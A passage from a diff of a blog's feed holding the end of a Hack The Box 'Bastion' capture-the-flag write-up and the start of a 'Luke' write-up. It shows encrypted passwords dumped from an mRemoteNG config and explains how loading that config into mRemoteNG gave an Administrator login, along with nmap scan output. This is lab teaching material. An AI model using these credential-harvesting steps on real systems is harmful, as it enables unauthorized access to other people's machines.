class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPMinutesToIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPAlertIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritLoadBalanceInfo=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPreExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPostExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritMacAddress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUserField=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCCompression=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCEncoding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCAuthMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyIP=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCSmartSizeMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCViewOnly=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUsageMethod=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayHostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUseConnectionCredentials=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;Node&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;L4mpje-PC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Connection&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Descr=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Icon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mRemoteNG&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Panel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;General&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;8d3579b2-e68e-48c1-8f0f-9ee1347c9128&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Username=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;L4mpje&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Domain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Password=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Hostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;192.168.1.75&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Protocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RDP&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PuttySession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Default Settings&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Port=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;3389&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ConnectToConsole=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UseCredSsp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RenderingEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ICAEncryptionStrength=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EncrBasic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPAuthenticationLevel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;NoAuth&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPMinutesToIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDPAlertIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;LoadBalanceInfo=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Colors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Colors16Bit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Resolution=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;FitToWindow&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;AutomaticResize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;true&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DisplayWallpaper=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;DisplayThemes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EnableFontSmoothing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;EnableDesktopComposition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;CacheBitmaps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectDiskDrives=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectPorts=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectPrinters=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectSmartCards=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectSound=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;DoNotPlay&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;SoundQuality=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Dynamic&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RedirectKeys=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;Connected=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PreExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;PostExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;MacAddress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;UserField=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;ExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCCompression=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;CompNone&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCEncoding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EncHextile&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCAuthMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;AuthVNC&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ProxyNone&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyIP=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCProxyPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ColNormal&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCSmartSizeMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;SmartSAspect&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;VNCViewOnly=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUsageMethod=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Never&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayHostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUseConnectionCredentials=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Yes&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;RDGatewayDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritCacheBitmaps=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDescription=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDisplayThemes=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDisplayWallpaper=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritEnableFontSmoothing=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritEnableDesktopComposition=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritIcon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPanel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritProtocol=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPuttySession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectDiskDrives=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectKeys=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectPorts=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectPrinters=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectSmartCards=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRedirectSound=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritSoundQuality=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritResolution=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritAutomaticResize=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUseConsoleSession=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUseCredSsp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRenderingEngine=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritICAEncryptionStrength=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPAuthenticationLevel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPMinutesToIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDPAlertIdleTimeout=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritLoadBalanceInfo=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPreExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritPostExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritMacAddress=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritUserField=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritExtApp=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCCompression=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCEncoding=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCAuthMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyType=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyIP=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyPort=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCProxyPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCColors=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCSmartSizeMode=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritVNCViewOnly=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUsageMethod=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayHostname=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUseConnectionCredentials=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayUsername=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayPassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;InheritRDGatewayDomain=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/mrng:Connections&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;First connection is an &lt;code class=&quot;highlighter-rouge&quot;&gt;RDP&lt;/code&gt; connection as &lt;code class=&quot;highlighter-rouge&quot;&gt;Administrator&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Name=&quot;DC&quot; Type=&quot;Connection&quot; Descr=&quot;&quot; Icon=&quot;mRemoteNG&quot; Panel=&quot;General&quot; Id=&quot;500e7d58-662a-44d4-aff0-3a4f547a3fee&quot; Username=&quot;Administrator&quot; Domain=&quot;&quot; Password=&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot; Hostname=&quot;127.0.0.1&quot; Protocol=&quot;RDP&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;Problem is, as I said in the &lt;a href=&quot;/hack-the-box/bastion/&quot;&gt;previous post&lt;/a&gt; this password is encrypted, that base-64 encoded string is just for the encrypted password, if you tried to decode it you’ll get nothing readable. We can use the same script I used in the previous post, or since we are on windows we can install &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; and replace the default &lt;code class=&quot;highlighter-rouge&quot;&gt;confCons.xml&lt;/code&gt; file with the one we have, edit the connection’s protocol and make it use &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;RDP&lt;/code&gt; then connect to the box.
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/12.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/13.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt; I closed &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; then I replaced &lt;code class=&quot;highlighter-rouge&quot;&gt;confCons.xml&lt;/code&gt; with the one I got from the box :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/14.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Now if we open &lt;code class=&quot;highlighter-rouge&quot;&gt;mRemoteNG&lt;/code&gt; again we should see the new connections :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/15.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;I edited the host and the protocol of &lt;code class=&quot;highlighter-rouge&quot;&gt;DC&lt;/code&gt; :&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/16.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/17.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;Then I connected to the box :
-&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/bastion-2/18.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
-&lt;br /&gt;And we owned root !
-&lt;br /&gt;That’s it , Feedback is appreciated !
-&lt;br /&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;
-&lt;br /&gt;Thanks for reading.
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/onetwoseven/&quot;&gt;Hack The Box - OneTwoSeven&lt;/a&gt;
-&lt;br /&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/luke/&quot;&gt;Hack The Box - Luke&lt;/a&gt;
-&lt;br /&gt;First post : &lt;a href=&quot;/hack-the-box/bastion/&quot;&gt;Hack The Box - Bastion&lt;/a&gt;&lt;/p&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="windows" /><category term="web" /><category term="ssh" /><category term="smb" /><category term="windows-exploitation" /><summary type="html">Quick Summary Hey guys, this is my second post for Bastion, in the first post I solved it with kali, in this one I will solve it with CommandoVM. Bastion’s ip is 10.10.10.134, I added it to C:\Windows\System32\drivers\etc\hosts as bastion.htb. Let’s jump right in ! Nmap We will start with nmap to scan for open ports and services : ``` C:\Users\rick\Desktop\HTB\boxes\bastion&amp;gt;nmap -sV -sT -sC -o nmapinitial bastion.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-06 16:23 Egypt Standard Time Nmap scan report for bastion.htb (10.10.10.134) Host is up (0.49s latency). Other addresses for bastion.htb (not scanned): 10.10.10.134 Not shown: 996 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xrick.github.io/hackthebox/bastion-2/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><category term="bsd" /><category term="web" /><summary type="html">Quick Summary Hey guys today Luke retired and here’s my write-up about it. It was an easy machine, all you need to do is to enumerate well and you’ll find what you need. It’s a FreeBSD box and its ip is 10.10.10.137, I added it to /etc/hosts as luke.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : ``` root@kali:~/Desktop/HTB/boxes/luke# nmap -sV -sT -sC -o nmapinitial luke.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-13 12:57 EET Nmap scan report for luke.htb (10.10.10.137) Host is up (0.23s latency). Not shown: 995 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) | ftp-anon: Anonymous FTP login allowed (FTP code 230) |drwxr-xr-x 2 0 0 512 Apr 14 12:35 webapp | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.xx.xx | Logged in as ftp | TYPE: ASCII | No session upload bandwidth limit | No session download bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3+ (ext.1) - secure, fast, stable |_End of status 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) | http-methods: | Potentially risky methods: TRACE |_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3 |_http-title: Luke 3000/tcp open http Node.js Express framework |_http-title: Site doesn’t have a title (application/json; charset=utf-8). 